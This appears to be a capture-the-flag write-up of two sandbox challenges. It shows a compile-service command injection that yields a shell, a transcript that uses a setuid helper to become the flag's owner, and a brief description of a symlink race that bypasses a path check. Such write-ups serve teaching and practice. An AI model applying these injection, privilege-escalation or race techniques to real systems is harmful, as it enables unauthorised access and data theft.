# Sandbox

## Dev Master 8000

Since they release a second version of `Dev Master`, I am 100 percent sure that most team solve in unintentional solution for the first challenge.

Basically they offer an online compile service. We provide an input file and an output file. The input file path will be sanitized. As long as command execution finished, the program will read a file with a name we provided, if the file is not a symlink and has a valid path, the program will read it and send the content. However, the compile command can be injected. Using `bash` instead of `gcc` allows you to get a shell. When you login, the magic part happen:
```
$ ./client nc devmaster.ctfcompetition.com 1337 -- source.cc -- binary -- sh 
$ id
uid=1338(sandbox-runner-0) gid=1338(sandbox-runner-0) groups=1338(sandbox-runner-0),0(root)
$ cd ../../
$ ls -la
total 1740
drwxrwxr-x 1 root  root     4096 Jun 22 04:02 .
drwxr-xr-x 1 root  root     4096 Jun 22 04:02 ..
-r-xr-xr-- 1 admin admin   56952 Jun 22 04:36 admin
-r-xr-xr-- 1 root  root     2344 Nov 29  1979 admin.cc
-r-xr-xr-- 1 root  root    77360 Nov 29  1979 admin_builder_client
drwxrwxr-x 1 root  root     4096 Jun 22 04:36 builds
-r-xr-xr-- 1 root  root     1571 Nov 29  1979 challenge.sh
-r-xr-xr-- 1 root  root    86184 Nov 29  1979 client
-rwsr-sr-- 1 root  root    12680 Nov 29  1979 drop_privs
-r-xr-xr-- 1 root  root    23736 Nov 29  1979 executor
-r--r----- 1 admin admin      43 Jun 22 04:02 flag
-r-xr-xr-- 1 root  root  1280576 Nov 29  1979 linux-sandbox
-r-xr-xr-- 1 root  root    69360 Nov 29  1979 multiplexer
-r-xr-xr-- 1 root  root    13014 Nov 29  1979 picosha2.h
-r-xr-xr-- 1 root  root   107984 Nov 29  1979 server
-r-xr-xr-- 1 root  root      724 Nov 29  1979 target_loop.sh
$ ./drop_privs admin admin sh
$ id
uid=1346(admin) gid=1346(admin) groups=1346(admin),0(root)
```

I don't know whether google did that intentionally or unintentionally...but this is quite stupid...

## Dev Master 8001

The permission issue is fixed here. But we can use a race condition to bypass the file path. When the program valid the file, we can execute out compiled file to symlink the program to flag location. And we can bypass the check.

# Pwn

